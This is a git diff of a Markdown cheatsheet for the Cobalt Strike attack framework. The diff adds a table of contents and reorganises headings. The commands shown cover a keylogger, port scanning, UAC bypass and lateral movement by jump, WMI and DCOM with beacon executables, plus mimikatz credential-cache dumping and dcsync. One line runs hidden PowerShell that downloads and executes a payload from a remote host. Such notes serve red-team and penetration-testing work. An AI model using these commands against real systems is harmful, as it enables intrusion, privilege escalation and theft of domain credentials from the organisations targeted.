@@ -1,4 +1,30 @@
 # Cobalt-Strike cheatsheet.
+* [General](#General)
+	* [Webserver](#Webserver)
+	* [TeamServer](#TeamServer)
+* [Listeners](#Listeners)
+* [Payloads](#Payloads)
+* [Command Execution](#Command-Execution)
+* [UAC Bypass](#UAC-Bypass)
+* [Lateral Movement](#Lateral-Movement)
+	* [User impersonation](#User-impersonation)
+	* [Techniques](#Techniques)
+* [Post Exploitation](#Post-Exploitation)
+	* [Credentials](#Credentials)
+	* [Session passing](#Session-passing)
+* [Pivoting](#Pivoting)
+	* [Socksproxy](#Socksproxy)
+	* [Using proxychains](#Using-proxychains)
+	* [Manual port forwards](#Manual-port-forwards)
+	* [NTLMRelaying with CS](#NTLMRelaying-with-cobalt-strike)
+* [Evasion](#Evasion)
+	* [Malleable C2 profile](#Malleable-C2-profile)
+	* [Artifact-kit](#Artifact-kit)
+	* [Resource-kit](#Resource-kit)
+* [Extending Cobalt Strike](#Extending-Cobalt-Strike)
+	* [Agressor scripts](#Agressor-scripts)
+	* [Beacon Object Files](#Beacon-Object-Files)
+
 # General
 #### Get current user
 ```
@@ -44,7 +70,7 @@ keylogger
 portscan <CIDR> 139,445,3389,5985 none 1024
 ```
 
-### Webserver
+## Webserver
 #### Upload file
 - Go to Site Management -> Host File and select your document.
 - Set the Location URI, Local Host and click Launch.
@@ -197,20 +223,6 @@ link <COMPUTERNAME>
 ## UAC Bypass
 - https://github.com/cobalt-strike/ElevateKit
 
-#### UAC bypass
-- Typing `elevate` and then tab lets you cycle through the methods.
-```
-elevate <METHOD> <LISTENER>
-elevate uac-schtasks tcp-local
-```
-
-#### UAC bypass method 2 runasadmin
-```
-runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
-connect localhost 4444
-```
-- Not all UAC bypasses are created equal, can elevate to system with:
-
 ## Command Execution
 #### Execute cmd command
 ```
@@ -236,6 +248,19 @@ execute-assembly <PATH TO EXE> -group=system
 #### Load PowerShell script
 ```
 powershell-import <FILE>
+```
+
+#### UAC bypass
+- Typing `elevate` and then tab lets you cycle through the methods.
+```
+elevate <METHOD> <LISTENER>
+elevate uac-schtasks tcp-local
+```
+
+#### UAC bypass method 2 runasadmin
+```
+runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
+connect localhost 4444
 ```
 
 ## Lateral Movement
@@ -334,7 +359,7 @@ kerberos_ticket_use <FILE TO TICKET>
 kerberos_ccache_use
 ```
 
-## Lateral Movement Techniques
+### Techniques
 #### Jump
 ```
 jump [method] [target] [listener]
@@ -360,7 +385,6 @@ remote-exec [method] [target] [command]
 ### Custom
 - Use primitives such as `powershell`, `execute-assembly`, etc to implement something custom with for example an agressor script.
 
-### PowerShell Remoting
 #### Getting the architecture
 - for winrm or winrm64 with jump
 ```
@@ -394,7 +418,7 @@ remote-exec wmi <HOSTNAME> <BEACON EXE>
 connect <HOSTNAME> <PORT>
 ```
 
-### WMI exec commands
+#### WMI exec commands
 ```
 remote-exec winrm <HOSTNAME> whoami; hostname
 ```
@@ -416,6 +440,7 @@ powershell-import Invoke-DCOM.ps1
 powershell Invoke-DCOM -ComputerName <HOSTNAME> -Method MMC20.Application -Command <BEACON EXE>
 ```
 
+## Post Exploitation
 ### Credentials
 - The `!`(Elevate to system) and `@`(Impersonate beacons thread) symbols are modifiers.
 - Go to View -> Credentials to see a copy of all the credentials
@@ -446,7 +471,7 @@ mimikatz !lsadump::cache
 dcsync <DOMAIN> <DOMAIN\USER>
 ```
 
-## Session passing
+### Session passing
 #### Beacon passing
 - From one beacon type to another
 - Spawn an process and inject shellcode for the specified listener into it.
